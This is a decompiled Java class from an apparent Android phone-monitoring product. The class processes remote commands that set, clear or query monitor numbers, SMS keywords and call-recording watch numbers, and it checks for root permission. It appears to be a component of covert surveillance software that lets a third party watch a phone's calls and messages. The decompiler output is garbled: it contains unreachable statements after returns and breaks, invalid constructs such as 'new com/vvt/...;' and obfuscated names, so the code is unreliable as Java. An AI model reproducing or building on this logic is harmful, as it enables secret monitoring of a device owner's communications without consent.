package com.vvt.remotecommand.processor.misc;

import com.vvt.base.FeatureId;
import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.exception.RequiresRootException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.b;
import java.util.Iterator;
import java.util.List;

public class d
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  public d(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  private ManageCommonDataConstant.CommonData a(String paramString)
  {
    ManageCommonDataConstant.CommonData[] arrayOfCommonData = ManageCommonDataConstant.a;
    int i = arrayOfCommonData.length;
    int j = 0;
    ManageCommonDataConstant.CommonData localCommonData = null;
    int k = 0;
    if (k < i)
    {
      localCommonData = arrayOfCommonData[k];
      String str = String.valueOf(localCommonData.getCode());
      boolean bool = str.equals(paramString);
      if (!bool) {}
    }
    for (;;)
    {
      return localCommonData;
      j = k + 1;
      k = j;
      break;
      j = 0;
      localCommonData = null;
    }
  }
  
  public static boolean a(String paramString, List paramList)
  {
    boolean bool1 = false;
    ManageCommonDataConstant.CommonData[] arrayOfCommonData = ManageCommonDataConstant.a;
    int i = arrayOfCommonData.length;
    int j = 0;
    for (;;)
    {
      if (j < i)
      {
        Object localObject = arrayOfCommonData[j];
        String str = String.valueOf(((ManageCommonDataConstant.CommonData)localObject).getCode());
        boolean bool2 = str.equals(paramString);
        if (bool2)
        {
          localObject = ((ManageCommonDataConstant.CommonData)localObject).getFeatureId();
          boolean bool3 = paramList.contains(localObject);
          if (bool3) {
            bool1 = true;
          }
        }
      }
      else
      {
        return bool1;
      }
      j += 1;
    }
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    int i = 0;
    Object localObject1 = null;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject2 = paramRemoteCommand.getCode();
    Object localObject3 = a((String)localObject2);
    if (localObject3 == null)
    {
      localObject2 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject2).<init>();
      throw ((Throwable)localObject2);
    }
    bool1 = a;
    if (bool1) {}
    Object localObject4 = paramRemoteCommand.getParameters();
    localObject2 = ((ManageCommonDataConstant.CommonData)localObject3).getType();
    boolean bool3 = ((ManageCommonDataConstant.CommonData)localObject3).requiresRoot();
    Object localObject5 = ManageCommonDataConstant.CommonDataType.CLEAR;
    if (localObject2 != localObject5)
    {
      localObject5 = ManageCommonDataConstant.CommonDataType.QUERY;
      if (localObject2 != localObject5) {}
    }
    else
    {
      j = ((List)localObject4).size();
      if (j == 0) {
        break label155;
      }
      localObject2 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject2).<init>();
      throw ((Throwable)localObject2);
    }
    int j = ((List)localObject4).size();
    if (j == 0)
    {
      localObject2 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject2).<init>();
      throw ((Throwable)localObject2);
    }
    label155:
    Object localObject6 = h();
    boolean bool2 = a;
    if (bool2) {}
    localObject2 = new com/vvt/remotecontrol/ControlCommand;
    localObject5 = RemoteFunction.DEBUG_IS_FULL_MODE;
    boolean bool4 = false;
    StringBuilder localStringBuilder = null;
    ((ControlCommand)localObject2).<init>((RemoteFunction)localObject5, null);
    localObject2 = ((com.vvt.remotecontrol.a)localObject6).execute((ControlCommand)localObject2);
    boolean bool5 = localObject2 instanceof Boolean;
    if (bool5)
    {
      localObject2 = (Boolean)localObject2;
      bool2 = ((Boolean)localObject2).booleanValue();
      bool5 = bool2;
      bool2 = a;
      if (bool2) {}
      localObject2 = ((ManageCommonDataConstant.CommonData)localObject3).getFeatureId();
      bool4 = a;
      if (bool4) {}
      bool4 = a;
      if (bool4) {}
      localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      int[] arrayOfInt = e.a;
      ManageCommonDataConstant.CommonDataType localCommonDataType = ((ManageCommonDataConstant.CommonData)localObject3).getType();
      int k = localCommonDataType.ordinal();
      int m = arrayOfInt[k];
      switch (m)
      {
      default: 
        label340:
        if (paramc != null)
        {
          if ((!bool3) || (bool5)) {
            break label944;
          }
          localObject2 = new com/vvt/remotecommand/exception/RequiresRootException;
          localObject5 = "The setting has been changed, however this feature requires root permission.";
          ((RequiresRootException)localObject2).<init>((String)localObject5);
          paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject2);
        }
        break;
      }
    }
    for (;;)
    {
      return;
      bool2 = b;
      if (bool2) {}
      bool5 = false;
      localObject5 = null;
      break;
      b.a((com.vvt.remotecontrol.a)localObject6, (FeatureId)localObject2, (List)localObject4);
      break label340;
      b.b((com.vvt.remotecontrol.a)localObject6, (FeatureId)localObject2, (List)localObject4);
      break label340;
      b.a((com.vvt.remotecontrol.a)localObject6, (FeatureId)localObject2);
      break label340;
      localObject2 = b.b((com.vvt.remotecontrol.a)localObject6, (FeatureId)localObject2);
      localObject4 = ((ManageCommonDataConstant.CommonData)localObject3).getFeatureId();
      localObject6 = FeatureId.MONITOR_NUMBER;
      if (localObject4 == localObject6)
      {
        localObject3 = "Monitor number:";
        localObject1 = new Object[0];
        localObject1 = String.format((String)localObject3, (Object[])localObject1);
        localStringBuilder.append((String)localObject1);
      }
      for (;;)
      {
        i = ((List)localObject2).size();
        if (i <= 0) {
          break label929;
        }
        localObject1 = ((List)localObject2).iterator();
        for (;;)
        {
          bool2 = ((Iterator)localObject1).hasNext();
          if (!bool2) {
            break;
          }
          localObject2 = (String)((Iterator)localObject1).next();
          localObject3 = localStringBuilder.append("\n");
          ((StringBuilder)localObject3).append((String)localObject2);
        }
        localObject4 = ((ManageCommonDataConstant.CommonData)localObject3).getFeatureId();
        localObject6 = FeatureId.HOME_NUMBER;
        if (localObject4 == localObject6)
        {
          localObject3 = "Home number:";
          localObject1 = new Object[0];
          localObject1 = String.format((String)localObject3, (Object[])localObject1);
          localStringBuilder.append((String)localObject1);
        }
        else
        {
          localObject4 = ((ManageCommonDataConstant.CommonData)localObject3).getFeatureId();
          localObject6 = FeatureId.NOTIFICATION_NUMBER;
          if (localObject4 == localObject6)
          {
            localObject3 = "Notification number:";
            localObject1 = new Object[0];
            localObject1 = String.format((String)localObject3, (Object[])localObject1);
            localStringBuilder.append((String)localObject1);
          }
          else
          {
            localObject4 = ((ManageCommonDataConstant.CommonData)localObject3).getFeatureId();
            localObject6 = FeatureId.SMS_KEYWORD;
            if (localObject4 == localObject6)
            {
              localObject3 = "Keyword:";
              localObject1 = new Object[0];
              localObject1 = String.format((String)localObject3, (Object[])localObject1);
              localStringBuilder.append((String)localObject1);
            }
            else
            {
              localObject4 = ((ManageCommonDataConstant.CommonData)localObject3).getFeatureId();
              localObject6 = FeatureId.CIS_NUMBER;
              if (localObject4 == localObject6)
              {
                localObject3 = "CIS number:";
                localObject1 = new Object[0];
                localObject1 = String.format((String)localObject3, (Object[])localObject1);
                localStringBuilder.append((String)localObject1);
              }
              else
              {
                localObject4 = ((ManageCommonDataConstant.CommonData)localObject3).getFeatureId();
                localObject6 = FeatureId.EMERGENCY_NUMBER;
                if (localObject4 == localObject6)
                {
                  localObject3 = "Emergency number:";
                  localObject1 = new Object[0];
                  localObject1 = String.format((String)localObject3, (Object[])localObject1);
                  localStringBuilder.append((String)localObject1);
                }
                else
                {
                  localObject4 = ((ManageCommonDataConstant.CommonData)localObject3).getFeatureId();
                  localObject6 = FeatureId.CALL_WATCH_NOTIFICATION;
                  if (localObject4 == localObject6)
                  {
                    localObject3 = "Watch number:";
                    localObject1 = new Object[0];
                    localObject1 = String.format((String)localObject3, (Object[])localObject1);
                    localStringBuilder.append((String)localObject1);
                  }
                  else
                  {
                    localObject3 = ((ManageCommonDataConstant.CommonData)localObject3).getFeatureId();
                    localObject4 = FeatureId.CALL_RECORDING_WATCH_NUMBER;
                    if (localObject3 == localObject4)
                    {
                      localObject3 = "Call recording watch number:";
                      localObject1 = new Object[0];
                      localObject1 = String.format((String)localObject3, (Object[])localObject1);
                      localStringBuilder.append((String)localObject1);
                    }
                    else
                    {
                      localObject3 = "Current list:";
                      localObject1 = new Object[0];
                      localObject1 = String.format((String)localObject3, (Object[])localObject1);
                      localStringBuilder.append((String)localObject1);
                    }
                  }
                }
              }
            }
          }
        }
      }
      label929:
      localObject2 = "\nNone";
      localStringBuilder.append((String)localObject2);
      break label340;
      label944:
      localObject2 = localStringBuilder.toString();
      bool5 = a;
      if (bool5) {}
      paramc.b(paramRemoteCommand, this, (String)localObject2);
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcManageCommonData";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/misc/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */